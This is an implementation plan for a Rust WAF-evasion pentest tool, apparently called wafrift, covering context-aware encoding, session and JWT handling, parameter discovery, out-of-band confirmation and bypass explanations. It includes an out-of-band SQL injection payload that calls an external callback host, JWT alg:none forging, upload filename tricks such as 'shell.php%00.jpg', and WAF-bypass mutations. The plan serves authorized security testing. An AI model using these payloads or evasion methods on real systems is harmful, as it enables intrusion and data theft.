# Implementation Plan: Features 1–6

This document organizes the implementation of the six highest-impact pentest features into concrete phases, crate boundaries, and data flows.

---

## Architecture Principles

1. **Types first** — every new concept lands in `wafrift-types` before any logic is written.
2. **No crate sprawl** — prefer extending existing crates over creating new ones unless the domain is genuinely separable.
3. **Backward compatibility** — all new APIs are additive; `--level heavy` must still work exactly as before.
4. **Testability** — each phase ships with property tests or mock-WAF E2E tests before the next phase starts.

---

## Phase 0: Contract Expansion (wafrift-types)

**Goal:** Define the data model every other crate will depend on.

**New types in `crates/types/src/`:**

```rust
// injection_context.rs
pub enum InjectionContext {
    JsonString,      // Inside a JSON string value: "PAYLOAD"
    JsonNumber,      // Inside a JSON number: 123 (injection as number)
    XmlAttribute,    // Inside XML tag attribute: <foo bar="PAYLOAD">
    XmlCdata,        // Inside <![CDATA[...]]>
    XmlText,         // Between XML tags
    HtmlAttribute,   // HTML attribute context
    HtmlText,        // Between HTML tags
    UrlQuery,        // URL-encoded query parameter
    UrlPath,         // URL path segment
    UrlFragment,     // After #
    HeaderValue,     // HTTP header value
    CookieValue,     // Cookie value (semi-colon sensitive)
    MultipartField,  // multipart/form-data field value
    MultipartFileName, // filename="..." in multipart
    PlainBody,       // Raw body with no structural context
}

// session.rs
pub struct SessionConfig {
    pub cookie_jar_path: Option<PathBuf>,
    pub csrf_extract_regex: Option<String>,
    pub auth_header: Option<String>,       // "Authorization: Bearer ..."
    pub jwt_signing_key: Option<String>,   // For alg:none / HS256 confusion
}

// oob.rs
pub struct OobConfig {
    pub provider: OobProvider,
    pub poll_interval_secs: u64,
    pub timeout_secs: u64,
}

pub enum OobProvider {
    Interactsh { server: String },
    BurpCollaborator { url: String },
    CustomDns { pattern: String },     // $(uuid).callbacks.example.com
}

pub struct OobCanary {
    pub id: Uuid,
    pub expected_dns: String,
    pub expected_http_path: String,
    pub created_at: Instant,
}

// discovery.rs
pub struct DiscoveredEndpoint {
    pub url: String,
    pub method: Method,
    pub injection_points: Vec<InjectionPoint>,
}

pub struct InjectionPoint {
    pub name: String,
    pub location: ParameterLocation,   // Query, Header, Body, Path
    pub context: InjectionContext,
    pub content_type_hint: Option<String>, // e.g. "application/json"
}

// explanation.rs
pub struct Explanation {
    pub original_payload: String,
    pub bypass_payload: String,
    pub technique_chain: Vec<String>,
    pub triggered_rules: Vec<RuleAttribution>,
    pub human_summary: String,
    pub diff: Vec<DiffHunk>,
}

pub struct RuleAttribution {
    pub rule_id: String,
    pub rule_name: String,
    pub matched_pattern: String,
    pub bypass_technique: String,
}
```

**Gate:** All new types compile, have `Serialize`/`Deserialize`, and doc-tests exist.

---

## Phase 1: Foundation (Parallel Workstreams)

### 1A. Context-Aware Encoding & Grammar
**Crates:** `wafrift-encoding`, `wafrift-grammar`

**Encoding (`crates/encoding/src/contextual.rs`):**
```rust
pub fn encode_in_context(
    payload: &[u8],
    strategy: Strategy,
    context: InjectionContext,
) -> Result<String, EncodeError>;
```
- URL strategies remain unchanged for `UrlQuery` / `UrlPath`
- For `JsonString`: after bypass, escape `"`, `\\`, `\b`, `\f`, `\n`, `\r`, `\t`, control chars
- For `XmlAttribute`: escape `"`, `<`, `>`, `&`
- For `HtmlAttribute`: context-aware quote matching
- For `CookieValue`: escape `;`, `=` if they appear post-mutation

**Grammar (`crates/grammar/src/contextual.rs`):**
- `mutate_in_context(payload, mutation, context)` — grammar mutations that know whether they need to preserve JSON string validity, XML well-formedness, etc.
- SQL comment insertion inside a JSON string must not break the JSON: `'" OR 1=1-- '` -> `'" OR 1=1\u002d\u002d '` (if needed)

**Test gate:** Proptest round-trip: `decode(encode_in_context(x, s, c), c) == x` for all strategies `s` and contexts `c`.

---

### 1B. Session & State Handling
**Crate:** `wafrift-transport`

**New modules:**
- `session.rs` — Cookie jar (`reqwest::cookie::Jar`), automatic cookie persistence to disk
- `csrf.rs` — Regex-based token extraction from responses, automatic injection into subsequent requests
- `jwt.rs` — JWT manipulation primitives:
  - `strip_alg(token)` -> `alg:none`
  - `hs256_with_key(token, key)` -> resign with symmetric key
  - `jwk_embed(token, jwk)` -> embed JWK in header

**API changes to `EvasionClient`:**
```rust
impl EvasionClient {
    pub fn with_session(config: SessionConfig) -> Result<Self, EvasionError>;
    pub async fn extract_csrf(&self, url: &str, regex: &str) -> Result<String, EvasionError>;
}
```

**Test gate:** Mock server that sets a cookie + CSRF token; client must replay both automatically.

---

### 1C. Parameter Discovery
**Crate:** `wafrift-recon` (extended)

**New modules:**
- `openapi.rs` — Parse OpenAPI 2/3 JSON/YAML, emit `Vec<DiscoveredEndpoint>`
- `graphql.rs` — Introspection query executor + alias/mutation mining
- `param_miner.rs` — Lightweight hidden-param discovery:
  - Wordlist of common params (`debug`, `test`, `callback`, `_schema`, etc.)
  - Differential response analysis (status code / body length) to detect valid params

**CLI integration:**
```bash
wafrift discover --target https://api.example.com --spec openapi.json
wafrift discover --target https://api.example.com/graphql --introspect
wafrift discover --target https://api.example.com/search --mine-params
```

**Output format:** JSON array of `DiscoveredEndpoint`, pipeable into `wafrift scan --from-file`.

**Test gate:** Wiremock server with hidden `?admin=true` param; discovery must find it.

---

## Phase 2: Core Features (Depends on Phase 0 + 1)

### 2A. OOB Confirmation
**Crate:** `wafrift-oracle` (extended)

**New module:** `oob.rs`

```rust
#[async_trait]
pub trait OobProvider: Send + Sync {
    async fn register(&self) -> Result<OobCanary, OobError>;
    async fn poll(&self, canary: &OobCanary) -> Result<Vec<OobInteraction>, OobError>;
}

pub struct OobOracle {
    provider: Box<dyn OobProvider>,
}

impl OobOracle {
    /// Returns true if the payload triggered an OOB callback.
    pub async fn confirm_execution(
        &self,
        payload: &str,
        canary: &OobCanary,
    ) -> Result<bool, OobError>;
}
```

**Integration points:**
- `wafrift-strategy`: After a `Bypass` verdict, if `--oob-confirm` is set, generate an OOB variant of the payload and re-send.
- `wafrift-transport`: Non-blocking background poller (tokio task) that checks for callbacks.

**CLI:**
```bash
wafrift scan --target ... --payload "' UNION SELECT load_file('\\\\$(uuid).oast.fun\\a')--" --oob-provider interactsh
```

**Test gate:** Mock OOB provider (in-memory callback log); bypass must be confirmed only when callback is received.

---

### 2B. Modern Protocol & Format Support
**Crate:** `wafrift-content-type` (extended, or rename to `wafrift-formats`)

**New modules:**
- `protobuf.rs` — Simple protobuf encoder for injection:
  - Wrap string payload in a `bytes` or `string` field
  - Use `prost` or custom lightweight encoder (minimal deps)
- `messagepack.rs` — `rmp-serde` wrapper: serialize JSON object with payload into MessagePack
- `grpc_web.rs` — gRPC-Web frame header + protobuf body (content-type `application/grpc-web`)
- `multipart_enhanced.rs`:
  - Filename evasion: `shell.php%00.jpg`, Unicode RTL override (`\u202e`)
  - Boundary confusion: mismatched boundary strings between WAF and parser
- `websocket.rs` — In `wafrift-smuggling`: WS upgrade tunnel, frame-level masking tricks

**API:**
```rust
pub enum BodyFormat {
    Json,
    Xml,
    Multipart,
    Protobuf { message_type: String },
    MessagePack,
    GrpcWeb,
    Raw,
}

pub fn serialize_for_format(payload: &str, format: BodyFormat, context: InjectionContext) -> Vec<u8>;
```

**Test gate:** Proptest serialization -> deserialization round-trip for each format.

---

### 2C. Per-Finding Explanation Engine
**Crates:** `wafrift-detect` (rule attribution), `wafrift-strategy` (explanation builder)

**wafrift-detect changes:**
Expose the internal rule database for attribution:
```rust
pub fn explain_block(payload: &str, waf: &DetectedWaf) -> Vec<RuleAttribution> {
    // Run payload against all known regex patterns for this WAF
    // Return which rules matched, not just the final score
}
```

**wafrift-strategy — new `explain.rs`:**
```rust
pub fn explain_bypass(
    original: &str,
    bypass: &str,
    techniques: &[Technique],
    waf: &DetectedWaf,
) -> Explanation {
    let triggered = wafrift_detect::explain_block(original, waf);
    let bypassed = wafrift_detect::explain_block(bypass, waf);  // Should be empty
    let diff = textual_diff(original, bypass);
    
    Explanation {
        human_summary: generate_human_summary(&triggered, &techniques, &diff),
        triggered_rules: triggered,
        diff,
        ..Default::default()
    }
}
```

**Human summary generation examples:**
- "WAF rule `SQLI-001` blocked the bare `UNION` keyword. Grammar mutation `comment_insertion` split it into `UN/**/ION`, which no longer matches the regex `(?i)\bunion\b`."
- "Rule `XSS-004` matched `<script>`. Encoding strategy `HtmlEntityEncode` transformed `<` to `&lt;`, bypassing the regex while the browser decoded it back."

**CLI:**
```bash
wafrift scan ... --explain         # Inline explanations in output
wafrift replay ... --explain       # Single finding explanation
wafrift report --include-explanations  # Markdown with rule attribution
```

**Test gate:** Mock WAF with known rule patterns; explanation must correctly attribute the bypass to the technique that removed the pattern match.

---

## Phase 3: Pipeline Integration (wafrift-strategy)

**Goal:** Wire all Phase 1–2 features into a single coherent evasion flow.

**New pipeline stages in `EvasionPipeline`:**

```
1. DISCOVER    (optional)  -> Param discovery / OpenAPI ingestion
2. CONTEXTUALIZE           -> Determine InjectionContext for each point
3. BASELINE                -> Send benign requests, establish response variance
4. MUTATE                  -> Encoding + Grammar (context-aware)
5. FORMAT                  -> Content-Type / Protobuf / MessagePack wrapping
6. SESSION                 -> Apply cookies, CSRF, JWT mutations
7. TRANSPORT               -> Send via EvasionClient
8. ORACLE                  -> Block / Bypass / Challenge / Rate-limit verdict
9. OOB_CONFIRM (optional)  -> If bypass, send OOB variant and poll
10. EXPLAIN               -> Generate rule attribution + human summary
11. PERSIST               -> Save to gene bank
```

**Configuration cascade:**
```toml
# .wafrift.toml
[session]
cookie_jar = "~/.wafrift/sessions/target.jar"
csrf_regex = '<meta name="csrf" content="([^"]+)"'

[discovery]
openapi_spec = "./api.json"
graphql_introspect = true
mine_params = true

[oob]
provider = "interactsh"
poll_interval_secs = 5
timeout_secs = 60

[explain]
enabled = true
educational_mode = true   # Adds "Why this works" paragraphs
```

---

## Phase 4: CLI & Proxy Integration

### CLI New Subcommands / Flags
```bash
# Discovery
wafrift discover --target <URL> [--spec <file>] [--introspect] [--mine-params]

# Scan with full context awareness
wafrift scan --target <URL> --from-discovery discovery.json \
  --session-jar target.jar \
  --csrf-regex '...' \
  --oob-provider interactsh \
  --explain

# Format-aware scan
wafrift scan --target <URL> --payload "..." --format protobuf --message-type SearchRequest

# Replay with explanation
wafrift replay --target ... --from-host ... --explain --output finding.md
```

### Proxy Integration
- `wafrift-proxy` automatically discovers endpoints via passive OpenAPI/GraphQL introspection observation
- Cookie jar is per-host, persisted to `~/.wafrift/sessions/<host>.jar`
- OOB polling runs as a background tokio task; findings include OOB confirmation status
- `/_wafrift/findings.md` now includes explanations and rule attribution

---

## Crate Dependency Graph (New/Changed)

```
wafrift-types          (no internal deps — foundation)
    ↑
wafrift-encoding  <——  InjectionContext
wafrift-grammar   <——  InjectionContext
    ↑
wafrift-recon     <——  DiscoveredEndpoint, InjectionContext, InjectionPoint
    ↑
wafrift-oracle    <——  OobConfig, OobCanary  (+ wafrift-transport for polling)
    ↑
wafrift-content-type <—— BodyFormat, InjectionContext
    ↑
wafrift-detect    <——  explain_block() returns RuleAttribution
    ↑
wafrift-transport <——  SessionConfig, EvasionClient with session/jwt/csrf
    ↑
wafrift-strategy  <——  Orchestrates ALL of the above; builds Explanation
    ↑
wafrift-core      <——  Re-exports
    ↑
wafrift-cli / wafrift-proxy
```

---

## Testing Strategy Per Phase

| Phase | Test Type | What it proves |
|-------|-----------|----------------|
| 0 | Doc-tests + compile | Types are consistent |
| 1A | Proptest round-trip | Context-aware encoding never corrupts structure |
| 1A | E2E mock WAF | Context-aware bypasses work where generic encoding fails |
| 1B | Wiremock session flow | Cookies + CSRF + JWT replay correctly |
| 1C | Hidden param discovery | Finds `?admin=true` against differential mock |
| 2A | Mock OOB provider | Confirms bypass only on callback |
| 2B | Protobuf/MessagePack round-trip | Serialization preserves payload |
| 2C | Rule attribution accuracy | Explanation correctly names the bypassed rule |
| 3 | Full pipeline E2E | End-to-end scan with all features enabled |
| 4 | CLI integration | Subcommands produce valid JSON/Markdown output |

---

## Recommended Execution Order

1. **Week 1:** Phase 0 (types) + Phase 1A (context-aware encoding) — this unlocks everything else
2. **Week 2:** Phase 1B (session) + 1C (discovery) — parallel, no interdependency
3. **Week 3:** Phase 2A (OOB) + 2B (modern formats) — parallel
4. **Week 4:** Phase 2C (explanations) — needs detect attribution + encoding context
5. **Week 5:** Phase 3 (pipeline integration) — wire everything together
6. **Week 6:** Phase 4 (CLI/proxy) + documentation + bench harness updates

---

## Risk Mitigation

- **Dependency bloat:** Keep `protobuf` support lightweight (custom encoder, not full `prost` build pipeline). If `prost` is too heavy, gate it behind a feature flag.
- **OOB polling complexity:** Make `OobProvider` trait-based so interactsh/collaborator are swappable; default to a no-op provider if none configured.
- **Context detection failure:** Always fall back to `PlainBody` / generic encoding if context cannot be determined; never fail closed.
- **Performance:** Context-aware encoding adds a branch per strategy; benchmark in `wafrift-bench` and ensure <5% throughput regression.
